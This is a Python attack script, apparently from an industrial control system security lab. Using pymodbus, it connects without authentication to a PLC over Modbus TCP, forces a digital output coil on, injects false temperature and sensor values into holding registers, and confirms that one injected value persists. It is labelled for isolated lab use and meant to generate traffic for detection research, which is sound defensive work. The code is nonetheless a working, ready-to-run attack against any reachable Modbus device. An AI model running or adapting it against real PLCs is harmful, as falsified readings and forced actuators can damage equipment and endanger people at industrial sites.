#!/usr/bin/env python3
"""
Unauthorized Modbus write / false data injection  (Task 3, Step 3b).

Connects to the PLC over Modbus TCP with NO authentication and MANIPULATES it:
  - forces the digital output (blink coil) ON               -> WRITE_SINGLE_COIL
  - injects false sensor values into holding registers      -> WRITE_SINGLE/MULTIPLE_REGISTERS
This is the "attacker controls the process" scenario.

Note: registers/coils that the PLC program actively drives (temp/pressure/flow/
level, blink) are overwritten by the program on its next scan (~50 ms), so the
*effect* is transient -- but the malicious WRITE is still sent and captured, which
is what matters for traffic-based detection. Writes to unused addresses persist.

For ISOLATED lab use only (see SECURITY.md).

Usage (inside Kali):  python3 modbus_write.py [host] [port]
"""
import sys
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)
print(f"[*] Connected to {HOST}:{PORT} -- no credentials required")

# 1) Force the digital output coil ON (unauthorized actuator control)
r = c.write_coil(0, True)
print("[*] WRITE_SINGLE_COIL  coil0 <- True :", "OK" if not r.isError() else r)

# 2) Inject a single false sensor value (falsify temperature register)
r = c.write_register(0, 9999)
print("[*] WRITE_SINGLE_REGISTER  reg0 <- 9999 :", "OK" if not r.isError() else r)

# 3) Falsify all four sensor registers at once (bulk false data injection)
r = c.write_registers(0, [9999, 8888, 7777, 6666])
print("[*] WRITE_MULTIPLE_REGISTERS regs0-3 <- [9999,8888,7777,6666] :",
      "OK" if not r.isError() else r)

# 4) Write to an UNUSED register and read it back -> proves injection persists
c.write_register(50, 4242)
rb = c.read_holding_registers(50, count=1)
val = rb.registers[0] if not rb.isError() else "ERR"
print(f"[*] Injected reg50 <- 4242, read back = {val}  (persists: program doesn't touch reg50)")

c.close()
print("[*] Done -- attacker wrote to the PLC with no authentication.")
